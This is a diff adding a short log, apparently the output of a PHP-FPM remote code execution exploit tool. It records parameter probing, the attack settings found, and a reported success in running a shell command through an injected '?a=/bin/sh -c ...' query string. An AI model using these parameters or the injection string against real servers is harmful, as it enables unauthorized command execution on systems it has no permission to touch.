@@ -1,0 +1,10 @@
+2026/10/23 14:21:56 Base status code is 200
+2026/10/23 14:21:56 Status code 502 for qsl=1750, adding as a candidate
+2026/10/23 14:21:56 The target is probably vulnerable. Possible QSLs: [1740 1745 1750]
+2026/10/23 14:21:56 Attack params found: --qsl 1745 --pisos 212 --skip-detect
+2026/10/23 14:21:56 Trying to set "session.auto_start=0"...
+2026/10/23 14:21:56 Detect() returned attack params: --qsl 1745 --pisos 212 --skip-detect <-- REMEMBER THIS
+2026/10/23 14:21:56 Performing attack using php.ini settings...
+2026/10/23 14:21:56 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2026/10/23 14:21:56 Trying to cleanup /tmp/a...
+rc=124
